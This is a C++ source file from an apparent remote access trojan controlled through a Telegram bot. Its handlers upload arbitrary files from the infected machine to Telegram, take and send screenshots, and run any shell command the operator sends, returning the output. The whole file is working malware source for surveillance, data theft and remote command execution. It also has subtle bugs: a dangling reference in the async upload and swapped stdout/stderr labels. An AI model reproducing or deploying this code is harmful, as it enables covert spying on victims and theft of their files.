/*rat_handler/src/threaded_handler.cpp*/
#include "rat/Handler.hpp"
#include "rat/networking.hpp"
#include "rat/system.hpp"
#include "rat/media.hpp"
#include <algorithm>
#include <chrono>
#include <mutex>
#include <optional>
#include <thread>
#include <fmt/core.h>
#include <fmt/chrono.h>
#include <string>
#include <boost/algorithm/string.hpp>
#include <memory>

#include "rat/ProcessManager.hpp"
#include "rat/handler/debug.hpp"


namespace rat::handler {
constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB; 

constexpr uint8_t TIMEMOUT_FOR_FILEOPS = 255;
// Command handler implementations
/*This method cannot run asynchronously for big files because the upload will be interrupted from the https requests that are sent from the parent thread */

void Handler::handleGetCommand() {
    if (command.parameters.empty()) {
        this->bot->sendMessage("No file specified");
        return;
    }

    const auto file_path = rat::system::normalizePath(command.parameters[0]);
    if (!std::filesystem::exists(file_path)) {
        this->bot->sendMessage(fmt::format("File does not exist: {}", file_path.string()));
        return;
    }
    
    const size_t file_size = std::filesystem::file_size(file_path);
    HANDLER_DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);

    if (file_size < 2 * 1024 * KB) {
        // small file → sync
        this->bot->sendFile(file_path);
    } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
        // medium file → async via thread pool
        this->long_process_pool->enqueue([this, &file_path] {
            
            HANDLER_DEBUG_LOG("Async upload {}", file_path.string());
            std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
            this->backing_bot->sendMessage(fmt::format("File: {} will be uploaded", file_path.string()));
            auto resp = this->backing_bot->sendFile(file_path);
            
            if (resp != rat::tbot::BotResponse::SUCCESS) {
                HANDLER_ERROR_LOG("Failed to upload {}", file_path.string());
            }
        });
    } else {
        this->bot->sendMessage(fmt::format(
            "File too big for Telegram (max 50 MB or /get method 2MB), this one is {}",
            file_size
        ));
    }
}

void Handler::handleScreenshotCommand() {
    auto image_path = std::filesystem::path(
        fmt::format("{}.png", rat::system::getCurrentDateTime_Underscored())
        );
    this->short_process_pool->enqueue([this, image_path] {
        std::string output_buffer;
        bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
        
        std::lock_guard<std::mutex> lock(backing_bot_mutex);

        if (success && std::filesystem::exists(image_path)) {
            HANDLER_DEBUG_LOG("{} taken", image_path.string());

            if (this->backing_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                HANDLER_ERROR_LOG("Failed uploading {}", image_path.string());
            }
        }
        if (!output_buffer.empty()) {
            this->backing_bot->sendMessage(output_buffer);
        }
        rat::system::removeFile(image_path);
    });

    this->bot->sendMessage("Screenshot command launched.");
}

void Handler::parseAndHandleProcessCommand() {
    std::string message_text = this->telegram_update->message.text;
    if (message_text.size() <= 9) return;          // Not enough length for "/process "
    {
        message_text.erase(0, 9);                      // Remove "/process "
        boost::trim(message_text);
    }
    // Find first space to separate timeout and command
    const size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
    if (space_pos == std::string::npos) {
        this->bot->sendMessage("Invalid command format");
        return;
    }

    std::string timeout_str = message_text.substr(0, space_pos);
    {
        message_text.erase(0, space_pos);              // Remove the timeout part
        boost::trim(message_text);
    }
    int timeout_ms = 0;
    try {
        timeout_ms = std::stoi(timeout_str);
        if (timeout_ms < 0) throw std::invalid_argument("negative timeout");
    } catch (...) {
        this->bot->sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
        return;
    }

    // Choose thread pool based on timeout and pending workers
    ::rat::threading::ThreadPool* p_process_pool = nullptr;
    if (timeout_ms > 4000 || this->short_process_pool->getPendingWorkersCount() > 1) {
        p_process_pool = this->long_process_pool.get();
    } else {
        p_process_pool = this->short_process_pool.get();
    }

    // Create and configure ProcessManager
    auto process_manager_Sptr = std::make_shared<::rat::process::ProcessManager>();
    {
        process_manager_Sptr->setCommand(message_text);
        process_manager_Sptr->setTimeout(std::chrono::milliseconds(timeout_ms));
        process_manager_Sptr->setOutputHandlingThreadPool(this->secondary_helper_pool);


        process_manager_Sptr->setProcessCreationCallback([this, process_manager_Sptr](pid_t pid){
            std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
            this->backing_bot->sendMessage(fmt::format("Process launched with id {}", pid));
        });
    }
    p_process_pool->enqueue([this, process_manager_Sptr]() {
        process_manager_Sptr->execute();

        std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
        this->backing_bot->sendMessage(
            fmt::format(
                "exit code:{}\nstderr:{}\nstdout:{}",
                process_manager_Sptr->getExitCode(),
                    process_manager_Sptr->getStdout(),
                    process_manager_Sptr->getStderr() 
            )
        );
    });
    return;
  }

}//namespace rat::handler
 //

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
    #undef DEBUG_RAT_HANDLER
#endif
